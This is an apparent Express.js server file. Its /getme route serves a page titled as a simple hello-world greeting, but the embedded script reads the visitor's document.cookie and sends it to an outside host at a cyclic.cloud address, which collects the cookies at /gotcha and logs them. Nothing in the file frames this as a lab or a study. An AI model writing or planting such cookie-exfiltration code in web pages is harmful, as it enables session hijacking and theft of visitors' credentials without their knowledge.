const express = require('express')
const app = express()
const cookieParser = require('cookie-parser');
const port = 3000


app.use(cookieParser());

app.get('/getme', (req, res) => {
    console.log(req.cookies)
    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>My HTML Page</title>
    </head>
    <body>

      <h1>Hello, this is your HTML response!</h1>

      <script>
      // JavaScript code goes here
      const cookies = document.cookie.split('; ');
      const cookieHeaders = cookies.map(cookie => cookie.trim()).join(';');
    
      const fetchOptions = {
        method: 'GET',
        headers: {
          'Cookie': cookieHeaders
        },
        // Additional fetch options like body, mode, etc.
      };
    
      // Make a fetch request with the cookies included in the headers
      fetch('https://fragile-cowboy-hat-colt.cyclic.cloud/gotcha', fetchOptions)
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
          // Handle the response data
          console.log(data);
        })
        .catch(error => {
          // Handle errors
          console.error('Fetch error:', error);
        });
    </script>
      


    </body>
    </html>
  `;

  res.setHeader('Content-Type', 'text/html');
  
  // Send the HTML content as the response
  res.send(htmlContent);
  });

  app.get('/gotcha', (req, res) => {
    console.log(req.cookies)
    res.send("hi") }
    )


    app.listen(port, () => {
        console.log(`server is starting at port ${port}`)
    })
